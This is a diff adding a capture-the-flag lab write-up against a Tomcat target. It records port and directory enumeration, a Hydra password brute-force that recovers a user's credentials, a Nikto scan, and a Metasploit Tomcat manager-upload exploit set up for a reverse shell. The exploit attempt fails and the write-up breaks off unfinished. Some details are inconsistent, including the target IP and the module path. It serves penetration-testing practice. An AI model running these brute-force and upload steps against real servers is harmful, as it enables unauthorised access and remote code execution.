@@ -1,0 +1,177 @@
+# Tools to be used:
+- dirbuster
+- hydra 
+- nmap 
+- nikto 
+- metasploit
+
+0.0. First of all we should scan ports of web-server to expand attacking surface:
+~ nmap -Sv server_ip
+############################
+Host is up (0.11s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+############################
+
+we get useful information about open SSH port, so in the near future we 
+will try to connect to this server
+
+0.1. the next step is an attempt to locate file /robots.txt
+############################
+Not Found
+############################
+
+1) On the website we see nothing  to interact with, so we use gobuster tool to 
+find some interesting directories/files
+
+~ gobuster dir -u http://10.10.69.196 -w /usr/share/wordlists/dirb/big.txt
+
+############################
+===============================================================
+2022/02/20 17:57:48 Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 296]
+/.htpasswd            (Status: 403) [Size: 296]
+/guidelines           (Status: 301) [Size: 317] [--> http://10.10.69.196/guidelines/]
+/protected            (Status: 401) [Size: 459]                                      
+/server-status        (Status: 403) [Size: 300]                                      
+                                                                                     
+===============================================================
+2022/02/20 17:59:10 Finished
+===============================================================
+############################
+
+we've found some interesting files: 
+- guidelines [#1] 
+- protected 
+
+1.1) Checking files, which we've found:
+- guidelines: 
+############################
+Hey bob, did you update that TomCat server? 
+############################
+it looks like somebody called Bob[#2] is working at this company 
+
+- protected[#3]: 
+visiting this website requires authentication. 
+Maybe we should find some credentials of user "Bob"
+
+2) we will try to brute-force password of bob with "Hydra". It is one 
+of the most common brute-force tool to pentest web-servers.
+
+I don't know, how to bruteforce websites with authentication pop-up, so
+I will try to find infromation about that in the Internet 
+
+############################
+https://www.reddit.com/r/hacking/comments/ek2b5m/how_to_brute_force_a_popup_box/
+############################
+
+In that link I found the answer how to bruteforce authentication pop-ups 
+in the proper way
+
+
+
+~ hydra -l bob -P /usr/share/wordlists/rockyou.txt -s 80 -f 10.10.69.196 http-get /protected
+
+############################
+[DATA] attacking http-get://10.10.69.196:80/protected
+[80][http-get] host: 10.10.69.196   login: bob   password: bubbles[#4]
+[STATUS] attack finished for 10.10.69.196 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-20 18:42:36
+############################
+
+We found password of Bob, now we can access with his account to the system
+
+3) After we connected to this page, we were requested to find another port to 
+connect
+
+############################
+This protected page has now moved to a different port.
+############################
+
+If we look to our previously discovered ports, we will find:
+:1234 [#5]
+:8009
+:22
+:80
+
+4) Let's try to connect to them
+
+on port 1234 we can see: Apache Tomcat/7.0.88 [#6]
+
+
+5) Now we should use "Nikto" with Bob credentials and scan the /manager/html
+directory on port 1234
+
+Nikto is the pentesting tool, which scans basic web vulnerabilities on the 
+web-server
+
+~ nikto -id bob:bubbles -host http://10.10.69.196:1234/manager/html 
+
+we got some information about misconfiguration on the server
+
+6) Let's check versions of software, which are used on the server. If something
+is out-dated, we can try to find it in metasploit database.
+
+~ nmap -sV 10.10.10.169 
+
+############################
+Host is up (0.043s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+############################
+
+Let's try to find 'Tomcat' in metasploit database:
+
+~ msfconsole
+msf> search tomcat
+
+now we can see various ways of exploitation of this piece of software. Let's 
+concentrate our attention on exploit: auxiliary/scanner/http/tomcat_mgr_upload,
+because we've already had Bob's password
+
+msf> use multi/http/tomcat_mgr_upload
+
+obtaining remote shell on the web-server will require uploading and executing
+file, but for Tomcat, the executable must be JavaServer Pages application
+
+msf> set USERNAME bob
+msf> set PASSWORD bubbles
+msf> set RHOST $ip
+msf> set TARGETURI /manager
+msf> set RPORT 1234
+msf> show TARGET 
+
+############################
+   Id  Name
+   --  ----
+   0   Java Universal
+   1   Windows Universal
+   2   Linux x86
+############################
+
+msf> set TARGET 0
+msf> run
+
+
+############################
+[*] Started reverse TCP handler on 192.168.1.31:4444 
+[*] Retrieving session ID and CSRF token...
+[-] Exploit aborted due to failure: unknown: Unable to access the Tomcat Manager
+[*] Exploit completed, but no session was created.
+############################
+
+Unfortunately, it doesn't work anymore ...
+
+TO BE CONTINUED...
